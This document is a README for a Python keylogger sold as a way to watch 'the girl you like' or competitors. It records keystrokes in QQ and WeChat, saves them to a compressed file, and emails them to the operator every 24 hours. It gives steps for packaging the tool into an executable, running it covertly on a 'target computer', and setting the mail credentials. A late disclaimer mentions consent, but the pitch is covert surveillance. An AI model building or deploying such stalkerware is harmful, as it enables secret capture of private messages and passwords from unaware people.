# Keyboard Activity Monitor

## Overview

Still can't forget the girl you like? Worried about your competitors? This program offers a way to monitor keyboard activities on target applications (such as QQ or WeChat) and automatically sends this data to your email at regular intervals.

### Features

- **Application Monitoring**: The program monitors the status of QQ or WeChat. When it detects that these applications are running, it begins recording keyboard activities.
- **Keylogging**: Records detailed information about keyboard activities, including key content, frequency, and timestamp.
- **Data Storage**: The recorded data is stored as a compressed binary file, saving storage space.
- **Email Sending**: The program periodically checks and sends the recorded keyboard data to a specified email address.
- **Data Reading**: A standalone program `Read.py` is provided to decompress and read the stored binary data, displaying it in a table format and allowing export to CSV or Excel files.
- **Packaging Tool**: The `Package_tool.py` allows the program to be packaged into a single executable file, supporting custom icons.

### File Descriptions

- **Application_Monitoring**: The main program that monitors the status of QQ and WeChat, records keyboard activities, saves the data as a compressed binary file, and periodically sends it via email.
- **Read.py**: A data reading tool that decompresses and reads the binary file generated by `Application_Monitoring`, providing data visualization and export functionality.
- **Package_tool.py**: A packaging tool that converts Python scripts into standalone executable files, with support for custom icons.

### Instructions

1. **Monitoring and Recording**:
   - Package `Application_Monitoring` (using the [packaging tool](https://github.com/ystemsrx/Application-Monitoring/releases)) into an executable and run it on the target computer. The program will continuously monitor the running status of QQ and WeChat in the background and start recording keyboard input.
   - The data will be stored in real-time in the `key_data.bin` file.
   - Every 24 hours, the data will be sent to your email.

2. **Reading and Exporting**:
   - Run the `Read.py` program (which can also be packaged). Drag and drop the `key_data.bin` file to view the recorded keyboard input data.
   - The data can be filtered and exported as CSV or Excel files for further analysis.

3. **Packaging Tool**:
   - Your computer must have Python installed, which you can [download here](https://www.python.org/downloads/release/python-3125/).
   - Use the packaging tool to package the above two scripts into standalone executable files by [clicking here](https://github.com/ystemsrx/Application-Monitoring/releases). Drag and drop the Python scripts into the interface to package them, with support for adding custom icons (just drag and drop the image or icon).

4. **Application List**
   - Add applications to `applications = ["QQ", "WeChat"]`. By default, QQ and WeChat are included. Separate applications with commas and enclose them in quotation marks. **Note**: Applications should be listed by their process names, not their common names (you can find this in Task Manager). For example, **WeChat Work** is named **WXWork**.

### Required Configurations

In the `Application_Monitoring` file, several configurations need to be filled in and modified to ensure the program works as expected:

1. **Email Configuration**:
   - `from_addr`: The sender's email address.
   - `to_addr`: The recipient's email address.
   - `password`: The SMTP authorization code for the sender's email. Please search for how to obtain the authorization code.

   Example:
   ```python
   from_addr = "your_email@example.com"
   to_addr = "recipient_email@example.com"
   password = "your_email_password_or_smtp_token"
   ```

2. **File Storage Path**:
   - `compressed_file`: The file path where compressed data is stored. Modify this path as needed to ensure the program has permission to read and write files at this location. It's recommended to store it on a drive other than C:.

   Example:
   ```python
   compressed_file = "D:\\your_path\\compressed_key_data.bin"
   ```

3. **Time Interval Settings**:
   - In the `check_time_and_send_email` function, the program is set to send recorded emails every 24 hours (86400 seconds) by default. You can modify this interval as needed, with a default of 24 hours.

   Example, modify to send every 12 hours:
   ```python
   if current_time - first_timestamp >= 43200:  # 12 hours in seconds
   ```

### TODO List

- [x] **Unified Application Monitoring**: Monitor an application by entering its name in a list, without needing to manually adjust the program code.

- [ ] **Data Interpretation Tool**: Currently, the program can only record keypress content but cannot interpret full pinyin input. A future tool will be developed to interpret and reconstruct the actual text input by the user, making it easier to understand the input content.

- [ ] **Startup on Boot**: Add the ability to automatically start the program when the computer boots.

### Disclaimer

This program's functionality may infringe on personal privacy or violate legal regulations. Ensure that you have obtained explicit consent from the relevant parties before using it and comply with the laws of your jurisdiction. Unauthorized monitoring and data collection may result in legal consequences. The developer is not responsible for any illegal use or consequences arising from it.
